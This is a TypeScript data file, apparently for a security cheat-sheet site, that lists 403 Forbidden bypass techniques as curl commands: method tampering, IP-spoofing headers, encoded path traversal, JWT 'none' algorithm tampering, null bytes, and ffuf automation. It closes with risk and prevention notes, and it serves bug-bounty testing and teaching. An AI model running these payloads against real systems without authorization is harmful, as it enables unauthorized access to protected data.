export interface Bypass403Category {
  category: string
  commands: { command: string; description: string }[]
}

export const bypass403Categories: Bypass403Category[] = [
  // =================== INTRODUCTION ==================
  {
    category: "Introduction to 403 Bypass",
    commands: [
      {
        command: "403 Bypass = Techniques to access forbidden (403) endpoints via HTTP tricks",
        description: "What is 403 Bypass?",
      },
      {
        command: "Common in bug bounty: admin panels, config files, backup directories",
        description: "Primary targets for 403 bypass",
      },
      {
        command: "Goal: Access restricted content without authentication/authorization",
        description: "Why bypass 403 errors?",
      },
    ],
  },

  // =================== 1. HTTP METHOD TAMPERING ==================
  {
    category: "1. HTTP Method Tampering",
    commands: [
      {
        command: `curl -X OPTIONS --path-as-is https://example.com/private/`,
        description: "#1 Try OPTIONS method (often less restricted)",
      },
      {
        command: `curl -X GET --path-as-is https://example.com/private/`,
        description: "#2 Try GET with --path-as-is",
      },
      {
        command: `curl -X POST --path-as-is https://example.com/private/`,
        description: "#3 Try POST method",
      },
      {
        command: `curl -X PUT --path-as-is https://example.com/private/`,
        description: "#4 Try PUT method",
      },
      {
        command: `curl -X DELETE --path-as-is https://example.com/private/`,
        description: "#5 Try DELETE method",
      },
      {
        command: `curl -X PATCH --path-as-is https://example.com/private/`,
        description: "#6 Try PATCH method",
      },
      {
        command: `curl -X HEAD --path-as-is https://example.com/private/`,
        description: "#7 Try HEAD method (no response body)",
      },
      {
        command: `curl -X TRACE --path-as-is https://example.com/private/`,
        description: "#8 Try TRACE method (may reveal config)",
      },
      {
        command: `curl -X CONNECT --path-as-is https://example.com/private/`,
        description: "#9 Try CONNECT method",
      },
      {
        command: `curl -X PROPFIND --path-as-is https://example.com/private/`,
        description: "#10 Try PROPFIND (WebDAV)",
      },
      {
        command: `curl -X MKCOL --path-as-is https://example.com/private/`,
        description: "#11 Try MKCOL (WebDAV)",
      },
      {
        command: `curl -X MOVE --path-as-is https://example.com/private/`,
        description: "#12 Try MOVE method",
      },
      {
        command: `curl -X LOCK --path-as-is https://example.com/private/`,
        description: "#13 Try LOCK method",
      },
      {
        command: `--path-as-is: Prevent URL normalization (critical for encoded paths)`,
        description: "Important: Always use --path-as-is for encoded paths",
      },
    ],
  },

  // =================== 2. HEADER MANIPULATION ==================
  {
    category: "2. Header Manipulation",
    commands: [
      {
        command: `curl -H "X-Original-URL: /admin" https://example.com/some-page`,
        description: "#1 X-Original-URL: Rewrite URL path (Nginx reverse proxy)",
      },
      {
        command: `curl -H "X-Rewrite-URL: /admin" https://example.com/some-page`,
        description: "#2 X-Rewrite-URL: Similar to X-Original-URL",
      },
      {
        command: `curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://example.com/private/`,
        description: "#3 Spoof internal IP (localhost) to bypass IP restrictions",
      },
      {
        command: `curl -H "X-Forwarded-For: 127.0.0.1" https://example.com/private/`,
        description: "#4 X-Forwarded-For: Spoof client IP",
      },
      {
        command: `curl -H "X-Client-IP: 127.0.0.1" https://example.com/private/`,
        description: "#5 X-Client-IP: Another IP spoofing header",
      },
      {
        command: `curl -H "X-Host: localhost" https://example.com/private/`,
        description: "#6 Manipulate Host header for host-based access controls",
      },
      {
        command: `curl -H "Referer: http://trustedsite.com/" https://example.com/private/`,
        description: "#7 Trick server into trusting the request source",
      },
    ],
  },

  // =================== 3. PATH FUZZING & ENCODING ==================
  {
    category: "3. Path Fuzzing & Encoding",
    commands: [
      {
        command: `curl -g --path-as-is "https://example.com/%2e%2e/admin"`,
        description: "#1 URL-encoded .. (../) to access admin",
      },
      {
        command: `curl -g --path-as-is "https://example.com/%2e%2e%2fadmin"`,
        description: "#2 Double-encoded slash with ..",
      },
      {
        command: `curl -g --path-as-is "https://example.com/%2e%2e%2f%2fadmin"`,
        description: "#3 Triple-encoded path traversal",
      },
      {
        command: `curl -g --path-as-is "https://example.com/%2e%2fadmin"`,
        description: "#4 ./admin with encoded dot",
      },
      {
        command: `curl -g --path-as-is "https://example.com/admin%2f"`,
        description: "#5 admin/ (trailing encoded slash)",
      },
      {
        command: `curl -g --path-as-is "https://example.com/admin%252f"`,
        description: "#6 Double-encoded slash at end",
      },
      {
        command: `curl -g --path-as-is "https://example.com/%20/admin"`,
        description: "#7 Space before path (%20)",
      },
      {
        command: `curl -g --path-as-is "https://example.com/admin%20"`,
        description: "#8 Trailing space encoded",
      },
      {
        command: `curl -g --path-as-is "https://example.com/admin."`,
        description: "#9 Add dot at end (may trick regex)",
      },
      {
        command: `curl -g --path-as-is "https://example.com//admin"`,
        description: "#10 Double slashes (may bypass normalization)",
      },
      {
        command: `curl -g --path-as-is "https://example.com/admin\\"`,
        description: "#11 Backslash (Windows path confusion)",
      },
      {
        command: `curl -g --path-as-is "https://example.com/ad\min"`,
        description: "#12 Mixed slashes (break parsers)",
      },
      {
        command: `curl -g --path-as-is "https://example.com/admin%c0%af"`,
        description: "#13 Unicode slash (special Unicode chars)",
      },
      {
        command: `curl -g --path-as-is "https://example.com/admin%ef%bc%8f"`,
        description: "#14 Unicode fullwidth slash",
      },
    ],
  },

  // =================== CASE MANIPULATION ==================
  {
    category: "Case Manipulation",
    commands: [
      {
        command: `curl https://example.com/admin`,
        description: "#1 Lowercase admin",
      },
      {
        command: `curl https://example.com/Admin`,
        description: "#2 Capitalize first letter",
      },
      {
        command: `curl https://example.com/ADMIN`,
        description: "#3 All uppercase",
      },
      {
        command: `curl https://example.com/aDmin`,
        description: "#4 Mixed case 1",
      },
      {
        command: `curl https://example.com/AdMiN`,
        description: "#5 Mixed case 2",
      },
      {
        command: `curl https://example.com/aDMIN`,
        description: "#6 Mixed case 3",
      },
      {
        command: `curl https://example.com/ADMin`,
        description: "#7 Mixed case 4",
      },
    ],
  },

  // =================== ADDING SUFFIXES ==================
  {
    category: "Adding Suffixes",
    commands: [
      {
        command: `curl https://example.com/admin.json`,
        description: "#1 Add .json extension",
      },
      {
        command: `curl https://example.com/admin.css`,
        description: "#2 Add .css extension",
      },
      {
        command: `curl https://example.com/admin.js`,
        description: "#3 Add .js extension",
      },
      {
        command: `curl https://example.com/admin.html`,
        description: "#4 Add .html extension",
      },
      {
        command: `curl https://example.com/admin.php`,
        description: "#5 Add .php extension",
      },
      {
        command: `curl https://example.com/admin.aspx`,
        description: "#6 Add .aspx extension",
      },
      {
        command: `curl https://example.com/admin.xml`,
        description: "#7 Add .xml extension",
      },
      {
        command: `curl https://example.com/admin.txt`,
        description: "#8 Add .txt extension",
      },
      {
        command: `curl https://example.com/admin.bak`,
        description: "#9 Add .bak extension (backup)",
      },
      {
        command: `curl https://example.com/admin.old`,
        description: "#10 Add .old extension",
      },
      {
        command: `curl https://example.com/admin.zip`,
        description: "#11 Add .zip extension (archive)",
      },
      {
        command: `curl https://example.com/admin.tar.gz`,
        description: "#12 Add .tar.gz extension",
      },
    ],
  },

  // =================== PARAMETER TAMPERING ==================
  {
    category: "Parameter Tampering",
    commands: [
      {
        command: `curl "https://example.com/admin?unused_param=1"`,
        description: "#1 Add unused parameter",
      },
      {
        command: `curl "https://example.com/admin?redirect=allowed"`,
        description: "#2 Add redirect parameter",
      },
      {
        command: `curl "https://example.com/admin?debug=true"`,
        description: "#3 Enable debug mode if supported",
      },
      {
        command: `curl "https://example.com/admin?access=granted"`,
        description: "#4 Add fake access parameter",
      },
      {
        command: `curl "https://example.com/admin?token=123"`,
        description: "#5 Add fake token parameter",
      },
    ],
  },

  // =================== 5. JWT TOKEN TAMPERING ==================
  {
    category: "5. JWT Token Tampering",
    commands: [
      {
        command: "1. Decode the JWT at jwt.io",
        description: "Step 1: Decode the JSON Web Token",
      },
      {
        command: "2. Change the role and remove the signature (set algorithm to none)",
        description: "Step 2: Modify payload and change algorithm",
      },
      {
        command: `curl -H "Authorization: Bearer <MODIFIED_JWT>" https://example.com/adminarea`,
        description: "Step 3: Resend with modified JWT token",
      },
    ],
  },

  // =================== 6. NULL BYTE INJECTION ==================
  {
    category: "6. Null Byte Injection",
    commands: [
      {
        command: `curl --path-as-is "https://example.com/admin.php%00.html"`,
        description: "#1 Null byte with .html suffix",
      },
      {
        command: `curl --path-as-is "https://example.com/config.php%00.json"`,
        description: "#2 Null byte with .json suffix",
      },
      {
        command: `curl --path-as-is "https://example.com/login.php%00?redirect=admin"`,
        description: "#3 Null byte in query string",
      },
      {
        command: `curl --path-as-is "https://example.com/user/profile%00.php"`,
        description: "#4 Null byte in path segment",
      },
      {
        command: `curl --path-as-is "https://example.com/images/logo%00.jpg"`,
        description: "#5 Null byte in image path",
      },
      {
        command: `curl --path-as-is "https://example.com/admin%00.php"`,
        description: "#6 Null byte directly in filename",
      },
      {
        command: `curl --path-as-is "https://example.com/uploads/file%00.zip"`,
        description: "#7 Null byte in upload path",
      },
    ],
  },

  // =================== 7. HTTP VERSION DOWNGRADE ==================
  {
    category: "7. HTTP Version Downgrade",
    commands: [
      {
        command: `curl --http1.0 https://example.com/private/`,
        description: "#1 Try HTTP/1.0 (older, less strict)",
      },
      {
        command: `curl --http1.0 https://example.com/secret`,
        description: "#2 HTTP/1.0 for sensitive endpoints",
      },
      {
        command: `curl --http1.1 https://example.com/config`,
        description: "#3 HTTP/1.1 (legacy support)",
      },
    ],
  },

  // =================== 8. BYPASS WITH PROXY OR IP SPOOFING ==================
  {
    category: "8. Bypass with Proxy or IP Spoofing",
    commands: [
      {
        command: `proxychains curl https://example.com/private/`,
        description: "#1 Use proxychains to route through different IP",
      },
      {
        command: `curl -H "X-Forwarded-For: 127.0.0.1" https://example.com/private/`,
        description: "#2 Spoof IP with X-Forwarded-For header",
      },
      {
        command: `curl -H "X-Real-IP: 127.0.0.1" https://example.com/private/`,
        description: "#3 X-Real-IP header spoofing",
      },
    ],
  },

  // =================== 9. SWITCH BETWEEN HTTP AND HTTPS ==================
  {
    category: "9. Switch Between HTTP and HTTPS",
    commands: [
      {
        command: `curl http://example.com/private/`,
        description: "#1 Try HTTP (some servers only protect HTTPS)",
      },
      {
        command: `curl https://example.com/private/`,
        description: "#2 Try HTTPS",
      },
      {
        command: `http://example.com/private/https://example.com/private/`,
        description: "#3 Mixed protocol reference",
      },
    ],
  },

  // =================== 10. EXPLORE ALTERNATE SUBDOMAINS & PORTS ==================
  {
    category: "10. Explore Alternate Subdomains & Ports",
    commands: [
      {
        command: `https://admin.example.com/admin/`,
        description: "#1 Try admin subdomain",
      },
      {
        command: `https://dev.example.com/admin/`,
        description: "#2 Try dev subdomain",
      },
      {
        command: `http://example.com:8080/admin/`,
        description: "#3 Try port 8080",
      },
      {
        command: `https://example.com:8443/admin/`,
        description: "#4 Try port 8443 (SSL alternative)",
      },
      {
        command: `http://example.com:8000/admin/`,
        description: "#5 Try port 8000",
      },
    ],
  },

  // =================== 11. SKIPPING THE HOST HEADER ==================
  {
    category: "11. Skipping the Host Header: A Sneaky Bypass Trick",
    commands: [
      {
        command: `curl --path-as-is -H "Host:" https://example.com/private/`,
        description: "Remove Host header entirely (may default to localhost)",
      },
      {
        command: "Misconfigured servers may default Host to 127.0.0.1 or localhost",
        description: "Why it works: Server treats request as internal",
      },
    ],
  },

  // =================== 12. ACCESSING 403 FILES USING WAYBACK MACHINE ==================
  {
    category: "12. Accessing 403 Files Using Wayback Machine",
    commands: [
      {
        command: `https://web.archive.org/web/*/https://example.com/secret-file.txt`,
        description: "#1 Search all snapshots of a 403 file",
      },
      {
        command: `https://web.archive.org/web/20240101000000/https://example.com/secret-file.txt`,
        description: "#2 Access specific date snapshot",
      },
      {
        command: "https://web.archive.org/web/ — Base URL for Wayback Machine",
        description: "Base URL format",
      },
      {
        command: "https://example.com/secret-file.txt — Target file to check for past versions",
        description: "Target file that is now 403",
      },
      {
        command: "May reveal old snapshots when file was publicly accessible",
        description: "Why it works: Past versions may not have been protected",
      },
    ],
  },

  // =================== NMAP ==================
  {
    category: "Nmap: Discover Supported Methods",
    commands: [
      {
        command: `nmap --script http-methods -p80,443 example.com`,
        description: "Scan for supported HTTP methods on target",
      },
      {
        command: `nmap --script http-methods -p80,443 www.nasa.gov`,
        description: "Example: Scan NASA.gov for HTTP methods",
      },
      {
        command: `Nmap done: 1 IP address (1 host up) scanned in X seconds`,
        description: "Nmap output shows supported methods",
      },
    ],
  },

  // =================== FFUF ==================
  {
    category: "FFUF: Automated 403 Bypass",
    commands: [
      {
        command: `cat payloads/403_header_payloads.txt | while read header; do ffuf -w payloads/403_url_payloads.txt:PATH -u "https://example.com/PATH" -H "$header" -mc 200 -fs 0 -x http://172.23.96.1:8080; done`,
        description: "Automate header + URL payload fuzzing with ffuf",
      },
      {
        command: "https://github.com/coffinxp/payloads/blob/main/403_header_payloads.txt",
        description: "CoffinXP header payloads for 403 bypass",
      },
      {
        command: "https://github.com/coffinxp/payloads/blob/main/403_url_payloads.txt",
        description: "CoffinXP URL payloads for path fuzzing",
      },
    ],
  },

  // =================== BURP SUITE 403 BYPASS EXTENSION ==================
  {
    category: "Burp Suite 403 Bypass Extension",
    commands: [
      {
        command: "Test 403 responses manually - slow process",
        description: "Challenge: Manual testing is time-consuming",
      },
      {
        command: "Burp 403 Bypass Extension automates header, method, and path manipulations",
        description: "Solution: Use Burp extension for automation",
      },
      {
        command: `curl https://example.com/403-page`,
        description: "Example: Accessing endpoint returns 403 Forbidden",
      },
      {
        command: "Extension quickly detects access control bypasses",
        description: "Benefit: Automated detection of bypass opportunities",
      },
    ],
  },

  // =================== 4-ZERO-3 TOOL ==================
  {
    category: "4-ZERO-3 Tool",
    commands: [
      {
        command: `4-zero-3 -u https://target.com/secret --exploit`,
        description: "Automated 403/401 bypass tool (simple yet effective)",
      },
      {
        command: "https://github.com/Dheerajmadhukar/4-ZERO-3",
        description: "GitHub repo for 4-ZERO-3 tool",
      },
      {
        command: "Warning: May produce false positives - always verify manually",
        description: "Important: Check content length and response content",
      },
    ],
  },

  // =================== RISKS ==================
  {
    category: "Risks of 403 Bypass Vulnerabilities",
    commands: [
      {
        command: "#1: Unauthorized Access - Attackers access protected endpoints",
        description: "Impact: Exposure or manipulation of sensitive data",
      },
      {
        command: "#2: Data Breaches - Gaining access to private information",
        description: "Impact: Financial loss, legal consequences, reputational damage",
      },
      {
        command: "#3: System Integrity Compromise - Alter backend functionality",
        description: "Impact: Undermines system reliability and trust",
      },
    ],
  },

  // =================== PREVENTION ==================
  {
    category: "Prevention & Mitigation",
    commands: [
      {
        command: "#1: Implement proper authentication & authorization checks",
        description: "Use secure session management and role-based access control",
      },
      {
        command: "#2: Avoid relying solely on HTTP method or header checks",
        description: "Implement defense in depth for access control",
      },
      {
        command: "#3: Use robust, tested access control libraries/frameworks",
        description: "Don't roll your own access control logic",
      },
      {
        command: "#4: Regularly audit and test access control mechanisms",
        description: "Use automated tools + manual testing for 403 bypasses",
      },
      {
        command: "#5: Monitor for suspicious access patterns and repeated 403s",
        description: "Implement logging and alerting for access attempts",
      },
    ],
  },
]

export const bypass403Tools = [
  {
    name: "CoffinXP Payloads",
    url: "https://github.com/coffinxp/payloads",
    description: "403 bypass payloads and wordlists collection",
  },
  {
    name: "4-ZERO-3",
    url: "https://github.com/Dheerajmadhukar/4-ZERO-3",
    description: "Automated 403/401 bypass tool",
  },
  {
    name: "Burp 403 Bypass Extension",
    url: "https://portswigger.net/burp/documentation/desktop/extensions/bypass-403",
    description: "Burp Suite extension for automated 403 bypass testing",
  },
  {
    name: "Nmap http-methods",
    url: "https://nmap.org/nsed-doc/scripts/http-methods.html",
    description: "Nmap script to enumerate HTTP methods",
  },
  {
    name: "Wayback Machine",
    url: "https://web.archive.org/",
    description: "Access past versions of now-restricted files",
  },
]
